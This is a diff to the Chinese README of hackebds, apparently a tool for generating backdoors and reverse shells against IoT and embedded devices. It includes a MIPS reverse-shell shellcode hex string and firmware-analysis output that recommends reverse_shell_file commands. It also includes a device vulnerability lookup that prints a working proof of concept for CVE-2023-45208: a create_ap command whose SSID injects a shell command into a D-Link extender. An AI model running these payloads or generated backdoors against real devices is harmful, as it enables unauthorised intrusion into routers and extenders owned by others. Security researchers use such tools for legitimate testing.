@@ -30,6 +30,17 @@
 
 5. 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
 
+6. 在0.4.0版本引入sqlite数据库，将统计的iot设备基本信息与对应CVE的exp或者poc进行存储，存储路径在~/.hackebds/hackebds.db文件中可以自行更新与添加内容，此文件不会日常更新，如果需要最新版本的设备信息与POC和EXP请查看github上的更新，
+
+7. 在0.4.0版本修复了如下问题：
+
+   1. armelv6的shellcode生成问题。
+   2. 使用-model 与设备型号纯大写无法使用报错问题
+
+8. 加入了--mcpu参数，此参数针对mips与arm，主要是针对特定架构的，比如24Kf等架构程序。
+
+9. 加入了--firmware参数，主要用于探测固件的架构信息，直接给出生成后门的命令
+
 
 
 ### 安装
@@ -311,6 +322,132 @@ mipsel_backdoor is ok in current path ./
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
+#### 3. 检测设备基本信息与漏洞信息
+
+##### 3.1 检测固件
+
+测试命令
+
+```bash
+hackebds --firmware ./114761.squashfs 
+```
+
+结果如下
+
+```
+[*] Initialize data file
+Initialized default database at /home/doudou/.hackebds/hackebds.db
+[+] Initialization completed
+[*] Analyzing firmware: ./114761.squashfs
+[*] Running binwalk scan...
+[*] Extracting firmware with binwalk -Me...
+[*] Found busybox: /tmp/hackebds_fw_knhezrtr/_114761.squashfs.extracted/squashfs-root/bin/busybox
+
+============================================================
+         FIRMWARE ANALYSIS RESULTS
+============================================================
+
+File: 114761.squashfs
+Size: 5,555,165 bytes (5.30 MB)
+
+[Encryption Check]
+  Entropy: 7.97/8.0
+  Status: Not encrypted
+
+[Bootloader]
+  Not detected or custom bootloader
+
+[Kernel]
+  Not detected
+
+[Filesystem]
+  Type: SquashFS
+
+[Compression]
+  Methods: XZ
+
+[Architecture]
+  Architecture: mips
+  Bits: 32
+  Endian: little
+  CPU Type: mips32r2
+  CPU Name: MIPS32 Release 2
+  hackebds arch: mipsel
+
+[Analyzed Binary]
+  File: busybox
+
+[Usage Example]
+  [Compatible Command - Recommended for General Use]
+  hackebds -arch mipsel -li -reverse_ip <IP> -reverse_port <PORT> -res reverse_shell_file
+
+  [Precise Command - For Best Compatibility with Target Device]
+  hackebds -mcpu mips32r2 -li -reverse_ip <IP> -reverse_port <PORT> -res reverse_shell_file
+
+  Note: Using -mcpu mips32r2 ensures the generated binary matches
+        the exact CPU type detected from the firmware. This provides better
+        compatibility but requires the target device to have the detected CPU.
+
+============================================================
+
+```
+
+
+
+##### 3.2 检查设备信息与漏洞信息
+
+```bash
+hackebds -model d-link816 -s
+```
+
+结果如下，匹配采用的是模糊匹配，输出最相似的结果
+
+```
+[*] Initialize data file
+[+] Initialization completed
+[+] Basic information of search d-link816
+[+] This may be the equipment you are looking for
+-----------------------------------------------------
+|D-Link_DAP-X1860                Similarity:     86%|
+-----------------------------------------------------
+|D-link-M30                      Similarity:     63%|
+-----------------------------------------------------
+|DIR-816                         Similarity:     62%|
+-----------------------------------------------------
+|TOTOLINK_A810R                  Similarity:     60%|
+-----------------------------------------------------
+|TOTOLINK_A860R                  Similarity:     60%|
+-----------------------------------------------------
+
+[+] Model is D-Link_DAP-X1860
+[+] Arch is mipsel
+[+] D-Link_DAP-X1860 is wifi extender
+[+] OS is linux
+[+] CPU vender is MediaTek
+[+] CPU model is MT7621A
+[+] Web Server is unknow
+[+] SSH server support(Default) unknow
+[+] Is it possible to eavesdrop: unknow
+[+] Default telnet user unknow
+[+] Default telnet passwd unknow
+[+] Sdk exist unknow
+[+] Openwrt support True
+[+] Vulnable True
+[+] Vulnerability information is as follows:
+----------------------------------------------------------------
+CVE-2023-45208  :  The Wi-Fi network scanning functionality of the D-Link DAP-X1860 range extender is susceptible to remote command injection. Attackers who create a Wi-Fi network with a crafted SSID in range of the extender can run shell commands during the setup process or when using the network scan function of the range extender.
+['https://www.redteam-pentesting.de/en/advisories/rt-sa-2023-006/-d-link-dap-x1860-remote-command-injection']
+CVE-2023-45208's EXP or POC:
+
+# This vulnerability seems to need to be actively triggered and needs to create an ap, so that the extender can actively connect and generate command injection in the ssid name of the ap.
+create_ap -n wlan0 "Test' && uname -a &&" randompw98zwrd8g283d3                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+----------------------------------------------------------------
+
+```
+
+
+
 ## chips and architectures
 
 Tests can leverage chips and architectures
